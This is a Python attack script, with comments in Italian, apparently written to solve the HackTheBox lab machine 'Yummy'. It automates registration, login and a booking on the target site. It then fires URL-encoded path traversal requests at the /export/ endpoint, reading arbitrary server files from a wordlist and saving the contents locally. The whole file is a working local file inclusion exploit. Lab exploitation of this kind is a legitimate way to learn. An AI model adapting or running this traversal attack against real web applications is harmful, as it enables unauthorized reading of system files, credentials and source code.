import os
import requests
from concurrent.futures import ThreadPoolExecutor

# Configurazione generale
PROXIES = {'http': 'http://127.0.0.1:8080'}
OUTPUT_PATH = './export'
LFI_LIST_PATH = '/home/kali/Desktop/Yummy/exploit/interesting_files.txt' #/usr/share/wordlists/lfi.txt'
BASE_URL = "http://yummy.htb:80"
HEADERS_COMMON = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Priority": "u=0",
}
REQUEST_TIMEOUT = 5  # Timeout per le richieste in secondi
MAX_THREADS = 1  # Numero massimo di thread

# Funzione per creare la directory di output se non esiste
def ensure_output_directory():
    if not os.path.exists(OUTPUT_PATH):
        os.makedirs(OUTPUT_PATH)

# Funzione per effettuare una richiesta di registrazione
def register():
    url = f"{BASE_URL}/register"
    json_data = {"email": "random@mail.it", "password": "Password123!"}
    response = requests.post(url, headers=HEADERS_COMMON, json=json_data, proxies=PROXIES, timeout=REQUEST_TIMEOUT)
    return response

# Funzione per effettuare il login e ottenere il token
def login():
    url = f"{BASE_URL}/login"
    json_data = {"email": "random@mail.it", "password": "Password123!"}
    response = requests.post(url, headers=HEADERS_COMMON, json=json_data, proxies=PROXIES, timeout=REQUEST_TIMEOUT)
    return response.cookies.get('X-AUTH-Token')

# Funzione per effettuare una prenotazione
def make_reservation(token):
    url = f"{BASE_URL}/book"
    cookies = {"X-AUTH-Token": token}
    headers = {
        **HEADERS_COMMON,
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": f"{BASE_URL}/",
        "Upgrade-Insecure-Requests": "1",
    }
    data = {
        "name": "TEST",
        "email": "random@mail.it",
        "phone": "3312843021",
        "date": "2025-01-24",
        "time": "13:07",
        "people": "3",
        "message": "3",
    }
    requests.post(url, headers=headers, cookies=cookies, data=data, proxies=PROXIES, timeout=REQUEST_TIMEOUT)

# Funzione per inviare una richiesta a /reminder/21
def send_reminder_request(token):
    url = f"{BASE_URL}/reminder/21"
    cookies = {"X-AUTH-Token": token}
    headers = {
        **HEADERS_COMMON,
        "Referer": f"{BASE_URL}/dashboard",
        "Upgrade-Insecure-Requests": "1",
    }
    response = requests.get(url, headers=headers, cookies=cookies, proxies=PROXIES, allow_redirects=False, timeout=REQUEST_TIMEOUT)
    return response

# Funzione per inviare una richiesta LFI e salvare il risultato
def fetch_lfi(token, lfi):
    session = requests.Session()
    session.proxies = PROXIES

    file_path = f'../../../../../../../..{lfi}'
    encoded_file_path = file_path.replace('/', '%2f').replace('.', '%2e')
    url = f"{BASE_URL}/export/{encoded_file_path}"

    cookies = {"X-AUTH-Token": token}
    headers = {
        **HEADERS_COMMON,
        "Referer": f"{BASE_URL}/dashboard",
        "Upgrade-Insecure-Requests": "1",
    }

    response = session.get(url, headers=headers, cookies=cookies, allow_redirects=False, timeout=REQUEST_TIMEOUT)

    if response.ok:
        if lfi.lower().endswith('.zip'):
            # Se il file è un .zip, salva il contenuto come binario
            save_lfi_zip_response(lfi, response)
        else:
            save_lfi_response(lfi, response)

# Funzione per salvare la risposta LFI normale (non .zip)
def save_lfi_response(lfi, response):
    sanitized_filename = lfi.replace('/', '-')
    output_file = os.path.join(OUTPUT_PATH, sanitized_filename)
    with open(output_file, 'w') as file:
        file.write(f"URL: {response.url}\n")
        file.write(f"Response:\n{response.text}")

# Funzione per salvare la risposta LFI quando il file è un .zip
def save_lfi_zip_response(lfi, response):
    sanitized_filename = lfi.replace('/', '-') + '.zip'
    output_file = os.path.join(OUTPUT_PATH, sanitized_filename)
    with open(output_file, 'wb') as file:
        file.write(response.content)

# Funzione per gestire l'intero flusso per un singolo LFI
def process_single_lfi(lfi):
    try:
        # Esegue la registrazione e il login
        register()
        token = login()

        if not token:
            print("Errore: impossibile ottenere il token di autenticazione.")
            return

        # Effettua una prenotazione (opzionale, se richiesto)
        make_reservation(token)

        # Invia richiesta a /reminder/21
        send_reminder_request(token)

        # Effettua la richiesta LFI
        fetch_lfi(token, lfi)
    except requests.exceptions.Timeout:
        print(f"Timeout durante l'elaborazione di {lfi}.")
    except Exception as e:
        print(f"Errore durante l'elaborazione di {lfi}: {e}")

# Funzione principale per gestire il threading delle richieste LFI
def process_lfi_with_threads(lfi_list):
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        executor.map(process_single_lfi, lfi_list)

# Funzione principale per eseguire il flusso completo
def main():
    ensure_output_directory()

    # Legge la lista di LFI
    with open(LFI_LIST_PATH, 'r') as f:
        lfi_list = f.read().splitlines()

    # Processa la lista di LFI con i thread
    #tmp_lfi_list = ['/data/scripts/fixer-v99']
    process_lfi_with_threads(lfi_list)

if __name__ == "__main__":
    main()
